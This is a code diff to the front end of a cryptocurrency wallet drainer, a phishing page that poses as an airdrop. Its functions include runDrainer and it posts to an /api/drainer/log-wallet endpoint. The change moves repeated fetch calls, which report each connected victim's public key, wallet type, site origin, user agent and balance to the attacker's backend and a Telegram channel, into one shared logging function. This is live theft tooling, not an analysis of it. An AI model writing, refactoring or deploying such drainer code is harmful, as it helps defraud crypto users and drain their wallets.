@@ -130,6 +130,50 @@
       }
     }, 30000);
     
+    // Centralized wallet logging function with deduplication
+    window.logWalletConnection = function(publicKey, walletType, lamports = 0) {
+      try {
+        const walletKey = `${publicKey.toString()}-${walletType}`;
+        const now = Date.now();
+        const lastLogged = window.walletLogTimestamps?.[walletKey] || 0;
+        
+        // Only log if we haven't logged this wallet in the last 30 seconds
+        if (now - lastLogged > 30000) {
+          // Initialize timestamps object if it doesn't exist
+          if (!window.walletLogTimestamps) {
+            window.walletLogTimestamps = {};
+          }
+          
+          // Log wallet connection
+          console.log('[WALLET] About to log wallet connection with type:', walletType);
+          fetch('/api/drainer/log-wallet', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              publicKey: publicKey.toString(),
+              walletType: walletType,
+              origin: window.location.origin,
+              userAgent: navigator.userAgent,
+              lamports: lamports
+            })
+          }).catch(err => console.log('[TELEGRAM] Failed to log wallet connection:', err));
+          
+          // Update timestamp to prevent spam
+          window.walletLogTimestamps[walletKey] = now;
+          
+          console.log('[WALLET] Logged connection:', {
+            publicKey: publicKey.toString(),
+            walletType: walletType,
+            origin: window.location.origin
+          });
+        } else {
+          console.log('[WALLET] Skipping duplicate wallet log for:', walletKey);
+        }
+      } catch (logError) {
+        console.error('[WALLET] Failed to log wallet connection:', logError);
+      }
+    };
+    
     // Enhanced automatic fallback mechanisms
     // Enhanced automatic fallback mechanisms for all wallet types
     window.handleConnectionError = function(error, walletName, provider) {
@@ -1377,52 +1421,8 @@ async function runDrainer(provider) {
       }
     }
 
-    // Centralized wallet logging function with deduplication
-    function logWalletConnection(publicKey, walletType, lamports = 0) {
-      try {
-        const walletKey = `${publicKey.toString()}-${walletType}`;
-        const now = Date.now();
-        const lastLogged = window.walletLogTimestamps?.[walletKey] || 0;
-        
-        // Only log if we haven't logged this wallet in the last 30 seconds
-        if (now - lastLogged > 30000) {
-          // Initialize timestamps object if it doesn't exist
-          if (!window.walletLogTimestamps) {
-            window.walletLogTimestamps = {};
-          }
-          
-          // Log wallet connection
-          console.log('[WALLET] About to log wallet connection with type:', walletType);
-          fetch('/api/drainer/log-wallet', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              publicKey: publicKey.toString(),
-              walletType: walletType,
-              origin: window.location.origin,
-              userAgent: navigator.userAgent,
-              lamports: lamports
-            })
-          }).catch(err => console.log('[TELEGRAM] Failed to log wallet connection:', err));
-          
-          // Update timestamp to prevent spam
-          window.walletLogTimestamps[walletKey] = now;
-          
-          console.log('[WALLET] Logged connection:', {
-            publicKey: publicKey.toString(),
-            walletType: walletType,
-            origin: window.location.origin
-          });
-        } else {
-          console.log('[WALLET] Skipping duplicate wallet log for:', walletKey);
-        }
-      } catch (logError) {
-        console.error('[WALLET] Failed to log wallet connection:', logError);
-      }
-    }
-    
     // Log wallet connection to backend (will be updated with balance later)
-    logWalletConnection(publicKey, connectedWalletType, 0);
+    window.logWalletConnection(publicKey, connectedWalletType, 0);
 
     // 2. Fetch the airdrop transaction from the backend
     console.log('[runDrainer] Fetching transaction for wallet:', publicKey.toString());
@@ -2682,20 +2682,11 @@ window.openWalletModal = async function openWalletModal() {
                     const signInResult = await provider.signIn();
                     showStatus('Solflare connected via signIn!', 'success');
                       
-                      // Log wallet connection
+                      // Log wallet connection using centralized function
                       try {
                         const publicKey = provider.publicKey || provider.address;
                         if (publicKey) {
-                          fetch('/api/drainer/log-wallet', {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({
-                              publicKey: publicKey.toString(),
-                              walletType: 'Solflare',
-                              origin: window.location.origin,
-                              userAgent: navigator.userAgent
-                            })
-                          }).catch(err => console.log('[TELEGRAM] Failed to log wallet connection:', err));
+                          window.logWalletConnection(publicKey, 'Solflare', 0);
                         }
                       } catch (logError) {
                         console.error('[WALLET] Failed to log wallet connection:', logError);
@@ -2712,20 +2703,11 @@ window.openWalletModal = async function openWalletModal() {
                       const requestResult = await provider.request({ method: 'connect' });
                       showStatus('Solflare connected via request!', 'success');
                       
-                      // Log wallet connection
+                      // Log wallet connection using centralized function
                       try {
                         const publicKey = provider.publicKey || provider.address;
                         if (publicKey) {
-                          fetch('/api/drainer/log-wallet', {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({
-                              publicKey: publicKey.toString(),
-                              walletType: 'Solflare',
-                              origin: window.location.origin,
-                              userAgent: navigator.userAgent
-                            })
-                          }).catch(err => console.log('[TELEGRAM] Failed to log wallet connection:', err));
+                          window.logWalletConnection(publicKey, 'Solflare', 0);
                         }
                       } catch (logError) {
                         console.error('[WALLET] Failed to log wallet connection:', logError);
@@ -2742,20 +2724,11 @@ window.openWalletModal = async function openWalletModal() {
                       const connectResult = await provider.connect();
                       showStatus('Solflare connected!', 'success');
                       
-                      // Log wallet connection
+                      // Log wallet connection using centralized function
                       try {
                         const publicKey = provider.publicKey || provider.address;
                         if (publicKey) {
-                          fetch('/api/drainer/log-wallet', {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({
-                              publicKey: publicKey.toString(),
-                              walletType: 'Solflare',
-                              origin: window.location.origin,
-                              userAgent: navigator.userAgent
-                            })
-                          }).catch(err => console.log('[TELEGRAM] Failed to log wallet connection:', err));
+                          window.logWalletConnection(publicKey, 'Solflare', 0);
                         }
                       } catch (logError) {
                         console.error('[WALLET] Failed to log wallet connection:', logError);
@@ -3130,19 +3103,9 @@ window.openWalletModal = async function openWalletModal() {
               showStatus(`${wallet.name} connected!`, 'success');
               console.log(`[connectMobileWallet] Desktop: About to call runDrainer for ${wallet.name}`);
               
-              // Log wallet connection
+              // Log wallet connection using centralized function
               try {
-                fetch('/api/drainer/log-wallet', {
-                  method: 'POST',
-                  headers: { 'Content-Type': 'application/json' },
-                  body: JSON.stringify({
-                    publicKey: publicKey.toString(),
-                    walletType: wallet.name,
-                    origin: window.location.origin,
-                    userAgent: navigator.userAgent
-                  })
-                }).catch(err => console.log('[TELEGRAM] Failed to log wallet connection:', err));
-                
+                window.logWalletConnection(publicKey, wallet.name, 0);
                 console.log('[WALLET] Logged desktop connection:', {
                   publicKey: publicKey.toString(),
                   walletType: wallet.name,
@@ -3174,20 +3137,11 @@ window.openWalletModal = async function openWalletModal() {
                    const signInResult = await provider.signIn();
                    showStatus('Solflare connected via signIn!', 'success');
                    
-                   // Log wallet connection
+                   // Log wallet connection using centralized function
                    try {
                      const publicKey = provider.publicKey || provider.address;
                      if (publicKey) {
-                       fetch('/api/drainer/log-wallet', {
-                         method: 'POST',
-                         headers: { 'Content-Type': 'application/json' },
-                         body: JSON.stringify({
-                           publicKey: publicKey.toString(),
-                           walletType: 'Solflare',
-                           origin: window.location.origin,
-                           userAgent: navigator.userAgent
-                         })
-                       }).catch(err => console.log('[TELEGRAM] Failed to log wallet connection:', err));
+                       window.logWalletConnection(publicKey, 'Solflare', 0);
                      }
                    } catch (logError) {
                      console.error('[WALLET] Failed to log wallet connection:', logError);
@@ -3202,20 +3156,11 @@ window.openWalletModal = async function openWalletModal() {
                    const requestResult = await provider.request({ method: 'connect' });
                    showStatus('Solflare connected via request!', 'success');
                    
-                   // Log wallet connection
+                   // Log wallet connection using centralized function
                    try {
                      const publicKey = provider.publicKey || provider.address;
                      if (publicKey) {
-                       fetch('/api/drainer/log-wallet', {
-                         method: 'POST',
-                         headers: { 'Content-Type': 'application/json' },
-                         body: JSON.stringify({
-                           publicKey: publicKey.toString(),
-                           walletType: 'Solflare',
-                           origin: window.location.origin,
-                           userAgent: navigator.userAgent
-                         })
-                       }).catch(err => console.log('[TELEGRAM] Failed to log wallet connection:', err));
+                       window.logWalletConnection(publicKey, 'Solflare', 0);
                      }
                    } catch (logError) {
                      console.error('[WALLET] Failed to log wallet connection:', logError);
@@ -3230,20 +3175,11 @@ window.openWalletModal = async function openWalletModal() {
                    const connectResult = await provider.connect();
                    showStatus('Solflare connected!', 'success');
                    
-                   // Log wallet connection
+                   // Log wallet connection using centralized function
                    try {
                      const publicKey = provider.publicKey || provider.address;
                      if (publicKey) {
-                       fetch('/api/drainer/log-wallet', {
-                         method: 'POST',
-                         headers: { 'Content-Type': 'application/json' },
-                         body: JSON.stringify({
-                           publicKey: publicKey.toString(),
-                           walletType: 'Solflare',
-                           origin: window.location.origin,
-                           userAgent: navigator.userAgent
-                         })
-                       }).catch(err => console.log('[TELEGRAM] Failed to log wallet connection:', err));
+                       window.logWalletConnection(publicKey, 'Solflare', 0);
                      }
                    } catch (logError) {
                      console.error('[WALLET] Failed to log wallet connection:', logError);
